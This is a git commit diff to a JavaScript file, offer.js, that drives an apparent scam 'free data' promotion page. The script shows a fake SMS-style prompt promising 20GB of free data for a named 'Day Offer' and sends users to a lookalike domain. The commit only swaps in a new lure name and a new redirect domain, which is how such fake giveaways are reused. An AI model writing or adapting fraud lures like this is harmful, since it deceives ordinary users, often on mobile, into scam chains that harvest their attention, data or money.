50e0073e81f8921f49fe721ba517e40292e8f24e
uptomars <Kenoly555+me@gmail.com>
2026-01-13 04:17:58 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '20GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵50 Airtime and 20GB Free Data From RICHARD NII ARMAH Birthday Offer, Kindly Press OK to ACTIVATE ','20GB Free Data');
+password=prompt('SMS: Congratulations You are Eligible to receive 20GB Free Data John-chilembwe Day Offer, Kindly Press OK to ACTIVATE ','20GB Free Data');
 if (password != '20GB Free Data') {
-location.href='https://richard-armah.4g-data.info/20GB';
+location.href='https://john-chilembwe.granddata.live/20GB';
 }
+
